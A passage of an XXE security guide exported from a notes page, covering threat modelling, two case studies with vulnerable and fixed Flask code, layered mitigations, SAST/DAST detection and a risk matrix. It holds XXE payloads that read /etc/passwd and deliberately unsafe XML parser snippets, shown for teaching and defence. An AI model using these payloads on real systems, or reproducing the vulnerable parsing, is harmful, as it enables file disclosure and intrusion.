id="2d5562ad-76f0-80cc-a734-d7b02edb2cb4" class=""><strong>Mitigation:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-807b-a693-c8a27f74f645" class="bulleted-list"><li style="list-style-type:disc">Input validation</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80d0-ae3f-d2a804690022" class="bulleted-list"><li style="list-style-type:disc">Secure parsers</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8006-9908-db5b7556252c" class="bulleted-list"><li style="list-style-type:disc">Whitelist XML structures</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8006-b107-ff4a051af6d5" class=""><strong>Risk Rating:</strong> Medium</p></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-8024-9f70-e7e1ab6b3df2"/></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-80a7-8611-f0b0f69e7b61" class=""><strong>Repudiation</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8038-a3e3-e775b0f28631" class=""><strong>Threat:</strong> Actions via XXE cannot be attributed.</p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80b7-a103-f861f1ff0479" class=""><strong>Mitigation:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8020-aa3f-c0d5b2234cb6" class="bulleted-list"><li style="list-style-type:disc">Comprehensive logging</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8047-a1a5-dc152ce75b1c" class="bulleted-list"><li style="list-style-type:disc">Request correlation</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8060-9ac7-d68649de7d02" class="bulleted-list"><li style="list-style-type:disc">Audit trails</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-806e-bd5a-dc5eb924da02" class=""><strong>Risk Rating:</strong> Medium</p></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-8087-a453-ee90a68c47a3"/></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-8066-be80-c520cb839928" class=""><strong>Information Disclosure</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8049-8e86-d9424952bfa3" class=""><strong>Threat:</strong> Attacker accesses sensitive files via XXE.</p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80c8-894b-f128e9df52b2" class=""><strong>Mitigation:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8001-856c-cdffafc1bb79" class="bulleted-list"><li style="list-style-type:disc">Disable external entities</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-801c-b4c3-fbbc02e43640" class="bulleted-list"><li style="list-style-type:disc">Secure file permissions</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8071-b532-f507172f1ea7" class="bulleted-list"><li style="list-style-type:disc">Input validation</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8059-929b-c09623f07ebd" class=""><strong>Risk Rating:</strong> Critical</p></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-80af-8f20-c303ec49ec37"/></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-8087-a2ac-c9d450c071e8" class=""><strong>Denial of Service</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-802f-bdaa-d624a5aa71ae" class=""><strong>Threat:</strong> Attacker causes DoS via entity expansion.</p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8018-8c89-f797dde72312" class=""><strong>Mitigation:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8068-9599-d39c83eac3a9" class="bulleted-list"><li style="list-style-type:disc">Disable external entities</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8020-9c77-db9c37540db3" class="bulleted-list"><li style="list-style-type:disc">Resource limits</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80c4-9191-e038ee2e7a39" class="bulleted-list"><li style="list-style-type:disc">Entity expansion limits</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8045-8fc5-c5f72b2700c2" class=""><strong>Risk Rating:</strong> High</p></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-80c6-967a-f82a17b0aee4"/></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-8017-9d3a-ffda010088ea" class=""><strong>Elevation of Privilege</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8031-a1b0-c9cf77a17f77" class=""><strong>Threat:</strong> Attacker gains access to internal resources via SSRF.</p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80f3-97ed-cb47f7644ee8" class=""><strong>Mitigation:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80ec-8157-fac576dd7089" class="bulleted-list"><li style="list-style-type:disc">Disable external entities</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80b5-b8f3-c545f0fa5570" class="bulleted-list"><li style="list-style-type:disc">Network segmentation</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-802e-94ec-d558870c549b" class="bulleted-list"><li style="list-style-type:disc">Least privilege</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80cb-a9f8-cef4fba86216" class=""><strong>Risk Rating:</strong> Critical</p></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-80e6-b059-d6e20a259122"/></div><div style="display:contents" dir="auto"><h2 id="2d5562ad-76f0-8014-9636-c934f94b982e" class=""><strong>Real-World Case Studies</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-80c8-abf9-e5714466a26d" class=""><strong>Case Study 1: File Disclosure in SOAP Endpoint</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8075-ad7f-d5c9a1d45a33" class=""><strong>Background:</strong> Penetration test discovered XXE in SOAP web service.</p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-803f-a413-d6579b35c207" class=""><strong>Vulnerable Code:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8068-a299-c4306fc73e5e" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all">from xml.etree.ElementTree import parse
+from flask import request
+
+@app.route(&#x27;/soap&#x27;, methods=[&#x27;POST&#x27;])
+def soap_handler():
+    xml_data = request.data
+    tree = parse(xml_data)  # Vulnerable!
+    # Process SOAP request
+    return soap_response
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80ab-8676-d37d8a7e1afe" class=""><strong>Exploitation:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-809c-a196-df064e6dd3e7" class="code code-wrap"><code class="language-XML" style="white-space:pre-wrap;word-break:break-all">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;
+]&gt;
+&lt;soap:Envelope&gt;
+  &lt;soap:Body&gt;
+    &lt;foo&gt;&amp;xxe;&lt;/foo&gt;
+  &lt;/soap:Body&gt;
+&lt;/soap:Envelope&gt;
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80ad-8e30-ccadd94d37e3" class=""><strong>Impact:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8060-bbec-f0724dcb9727" class="bulleted-list"><li style="list-style-type:disc"><strong>Confidentiality</strong>: Critical - File system access</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-802d-870c-d99b1c77d763" class="bulleted-list"><li style="list-style-type:disc"><strong>Integrity</strong>: High - Could access configuration files</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8083-b6fb-e3bd2f742880" class="bulleted-list"><li style="list-style-type:disc"><strong>Business Impact</strong>: Critical - Complete information disclosure</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8037-92b7-c511f9b0ac23" class=""><strong>Remediation:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80d0-b42c-db2e3e8c1208" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all">from defusedxml.ElementTree import parse
+
+@app.route(&#x27;/soap&#x27;, methods=[&#x27;POST&#x27;])
+def soap_handler():
+    xml_data = request.data
+    tree = parse(xml_data)  # Safe!
+    return soap_response
+</code></pre></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-8045-bcee-ee5859f7bfe0"/></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-8079-9555-f05678ea1219" class=""><strong>Case Study 2: SSRF via XML Upload</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80d9-9f59-fcb2be2d3c18" class=""><strong>Background:</strong> Security assessment revealed XXE in file upload functionality.</p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8098-b919-d6a69616e7e2" class=""><strong>Vulnerable Code:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-809e-a045-c6e1b9e4e197" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all">@app.route(&#x27;/upload&#x27;, methods=[&#x27;POST&#x27;])
+def upload_file():
+    file_content = request.files[&#x27;file&#x27;].read()
+    # Process as XML (Office documents contain XML)
+    tree = parse(file_content)  # Vulnerable!
+    return &quot;File uploaded&quot;
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-805f-9560-f2089aecd64f" class=""><strong>Exploitation:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-805c-aab2-cf331e7a2b0a" class="bulleted-list"><li style="list-style-type:disc">Attacker creates malicious Office document with XXE payload</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80da-ae3b-d9f1fa10890a" class="bulleted-list"><li style="list-style-type:disc">Uploads document</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-807f-847b-e8ff4d5f53f7" class="bulleted-list"><li style="list-style-type:disc">Server processes XML, makes HTTP request to internal service</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80cf-a0f8-df6be5060507" class=""><strong>Impact:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80b8-a407-c34976179f42" class="bulleted-list"><li style="list-style-type:disc"><strong>Confidentiality</strong>: Critical - Internal network access</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-805a-9562-e79f5fc842cd" class="bulleted-list"><li style="list-style-type:disc"><strong>Business Impact</strong>: Critical - SSRF to internal services</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-809b-be22-d22990252dc9" class=""><strong>Remediation:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80c5-b447-f2f97e1fb7c2" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all">from defusedxml.ElementTree import parse
+
+@app.route(&#x27;/upload&#x27;, methods=[&#x27;POST&#x27;])
+def upload_file():
+    file_content = request.files[&#x27;file&#x27;].read()
+    tree = parse(file_content)  # Safe!
+    return &quot;File uploaded&quot;
+</code></pre></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-806d-9582-e5d613625920"/></div><div style="display:contents" dir="auto"><h2 id="2d5562ad-76f0-80e0-861d-dbf95fb8771a" class=""><strong>Advanced Mitigations</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-80af-a6f8-fe7669e5e42f" class=""><strong>Defense in Depth Strategy</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80a0-9ee8-dfb186852ac1" class=""><strong>Layer 1: Secure XML Parser (Primary Defense)</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80b6-a3a0-d7dd77a88f3b" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all">from defusedxml.ElementTree import parse
+tree = parse(xml_data)
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8063-aaff-ff0dea864e16" class=""><strong>Layer 2: Input Validation</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80c6-87a3-d8c0d67364ed" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all">def validate_xml(xml_data):
+    if b&#x27;&lt;!DOCTYPE&#x27; in xml_data:
+        raise ValueError(&quot;DOCTYPE not allowed&quot;)
+    return xml_data
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80b5-b125-d419ade71152" class=""><strong>Layer 3: Network Restrictions</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-807f-8aef-f6bf93769dca" class="bulleted-list"><li style="list-style-type:disc">Restrict outbound connections</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8050-a173-f5a5425eafee" class="bulleted-list"><li style="list-style-type:disc">Network segmentation</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80e0-b4f0-edb337b5ff67" class="bulleted-list"><li style="list-style-type:disc">Firewall rules</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8083-9012-c68e84da4842" class=""><strong>Layer 4: File System Permissions</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-801a-a49b-e3654659ff40" class="bulleted-list"><li style="list-style-type:disc">Least privilege file access</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80a3-b176-c14da5de54e3" class="bulleted-list"><li style="list-style-type:disc">Secure configuration files</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8035-8065-ee65f45369b1" class="bulleted-list"><li style="list-style-type:disc">Read-only where possible</li></ul></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-80bd-ba04-c109398e9022"/></div><div style="display:contents" dir="auto"><h2 id="2d5562ad-76f0-8012-80a8-e31de03964e1" class=""><strong>SAST/DAST Detection</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-8077-aa89-e0628c4895d4" class=""><strong>SAST (Static Application Security Testing)</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80cc-a015-cfc4649c7c12" class=""><strong>Vulnerable Code Patterns:</strong></p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80e9-b64e-c4ff4efe0e78" class=""><strong>1. Unsafe XML Parser:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80d0-b262-c9bd1bd2abe8" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all"># ❌ VULNERABLE
+from xml.etree.ElementTree import parse
+tree = parse(xml_data)
+
+# SAST Detection:
+# - Pattern: Use of unsafe XML parser
+# - Severity: Critical
+# - CWE: CWE-611 (Improper Restriction of XML External Entity Reference)
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-809b-a9ee-f577773f3189" class=""><strong>2. Missing Parser Configuration:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80dc-a0a6-e336fd455698" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all"># ❌ VULNERABLE
+parser = etree.XMLParser()  # Default configuration
+tree = etree.parse(xml_data, parser)
+
+# SAST Detection:
+# - Pattern: XML parser without secure configuration
+# - Severity: Critical
+# - CWE: CWE-611
+</code></pre></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-8081-8ddb-c67acf038a9a"/></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-80a7-a2cc-e21e7b58640f" class=""><strong>DAST (Dynamic Application Security Testing)</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-805e-95e7-df73cf52a016" class=""><strong>Testing Methodology:</strong></p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80e6-9c07-e1e608caacd8" class=""><strong>1. Identify XML Processing:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80fe-b597-c8101e6e1629" class="bulleted-list"><li style="list-style-type:disc">Find endpoints accepting XML</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-809c-99f1-cfa1a5fb06f9" class="bulleted-list"><li style="list-style-type:disc">Identify file upload functionality</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8060-9391-e2c8f03123fe" class="bulleted-list"><li style="list-style-type:disc">Check SOAP endpoints</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8084-ae2a-c8575426a8a3" class=""><strong>2. Submit XXE Payloads:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80b7-9453-d95bc8ea530e" class="code code-wrap"><code class="language-XML" style="white-space:pre-wrap;word-break:break-all">&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;
+]&gt;
+&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80b9-8c75-dc061507f22f" class=""><strong>3. Analyze Responses:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80c8-850e-ccaa13fc6c76" class="bulleted-list"><li style="list-style-type:disc">Check for file contents</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8002-b980-cb177d13caae" class="bulleted-list"><li style="list-style-type:disc">Monitor network traffic</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-804a-87b0-cd9c965854b3" class="bulleted-list"><li style="list-style-type:disc">Check for error messages</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-805d-a47c-eb15a6c1cca6" class=""><strong>4. Test Blind XXE:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8049-9bfa-c2c0128ebbe2" class="bulleted-list"><li style="list-style-type:disc">Use out-of-band techniques</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80c7-a307-e44fff7151f6" class="bulleted-list"><li style="list-style-type:disc">Monitor external server for requests</li></ul></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-807e-97a1-ebd08701a782"/></div><div style="display:contents" dir="auto"><h2 id="2d5562ad-76f0-806c-b287-c7bc4dd134b9" class=""><strong>Risk Assessment</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-806a-af1e-f207d1bbb10d" class=""><strong>Risk Matrix</strong></h3></div><div style="display:contents" dir="ltr"><table id="2d5562ad-76f0-800c-9163-e83f047077bc" class="simple-table"><thead class="simple-table-header"><div style="display:contents" dir="ltr"><tr id="2d5562ad-76f0-8078-a5fc-ec90223def33"><th id="=q=t" class="simple-table-header-color simple-table-header">Vulnerability</th><th id="p;&gt;e" class="simple-table-header-color simple-table-header">Likelihood</th><th id="[GUK" class="simple-table-header-color simple-table-header">Impact</th><th id="z[{f" class="simple-table-header-color simple-table-header">Risk Level</th><th id="Ea{t" class="simple-table-header-color simple-table-header">Business Impact</th></tr></div></thead><tbody><div style="display:contents" dir="ltr"><tr id="2d5562ad-76f0-8073-acc6-c945af45445d"><td id="=q=t" class=""><strong>XXE with File Disclosure</strong></td><td id="p;&gt;e" class="">Medium</td><td id="[GUK" class="">Critical</td><td id="z[{f" class=""><strong>Critical</strong></td><td id="Ea{t" class="">Complete file system access</td></tr></div><div style="display:contents" dir="ltr"><tr id="2d5562ad-76f0-80be-8afb-d1e23ba5ff9d"><td id="=q=t" class=""><strong>XXE with SSRF</strong></td><td id="p;&gt;e" class="">Medium</td><td id="[GUK" class="">Critical</td><td id="z[{f" class=""><strong>Critical</strong></td><td id="Ea{t" class="">Internal network access</td></tr></div><div style="display:contents" dir="ltr"><tr id="2d5562ad-76f0-8004-a975-d9cdb2285afa"><td id="=q=t" class=""><strong>Blind XXE</strong></td><td id="p;&gt;e" class="">Medium</td><td id="[GUK" class="">High</td><td id="z[{f" class=""><strong>High</strong></td><td id="Ea{t" class="">Data exfiltration</td></tr></div><div style="display:contents" dir="ltr"><tr id="2d5562ad-76f0-806e-b89d-cfefb1891e7e"><td id="=q=t" class=""><strong>XXE DoS</strong></td><td id="p;&gt;e" class="">Medium</td><td id="[GUK" class="">High</td><td id="z[{f" class=""><strong>High</strong></td><td id="Ea{t" class="">Service unavailability</td></tr></div><div style="display:contents" dir="ltr"><tr id="2d5562ad-76f0-80a1-b916-e69f2413d73b"><td id="=q=t" class=""><strong>Missing Secure Parser</strong></td><td id="p;&gt;e" class="">High</td><td id="[GUK" class="">Critical</td><td id="z[{f" class=""><strong>Critical</strong></td><td id="Ea{t" class="">Multiple attack vectors</td></tr></div></tbody></table></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-8056-b6f2-cd3f1b15882c" class=""><strong>Risk Calculation</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80fc-9d19-c8d28695f75b" class=""><strong>Example: XXE in SOAP Endpoint</strong></p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80c9-beed-f45feec94e92" class=""><strong>Likelihood:</strong> Medium (0.6)</p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8025-84ef-e0587e933b26" class="bulleted-list"><li style="list-style-type:disc">Requires XML processing</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80eb-9edc-d11b0e546cb3" class="bulleted-list"><li style="list-style-type:disc">Less common than other vulnerabilities</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8035-b5e9-f49d0c981807" class="bulleted-list"><li style="list-style-type:disc">Often overlooked</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-808f-ab86-f131cdb6a270" class=""><strong>Impact:</strong> Critical (1.0)</p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-800a-a644-faf431a821b3" class="bulleted-list"><li style="list-style-type:disc">File system access</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8020-93a9-fd7fd62a9c72" class="bulleted-list"><li style="list-style-type:disc">SSRF potential</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8090-8cf6-c7663e8b172c" class="bulleted-list"><li style="list-style-type:disc">Data breach</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80d6-a094-e82a94ee8d13" class=""><strong>Risk Score:</strong> 0.6 × 1.0 = <strong>0.6 (Critical Risk)</strong></p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-801a-940d-f07f274e4793" class=""><strong>Business Impact:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80be-9ca9-c8d1f21bbe7e" class="bulleted-list"><li style="list-style-type:disc"><strong>Financial</strong>: Data breach, regulatory fines</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80b8-8d16-f090315873ad" 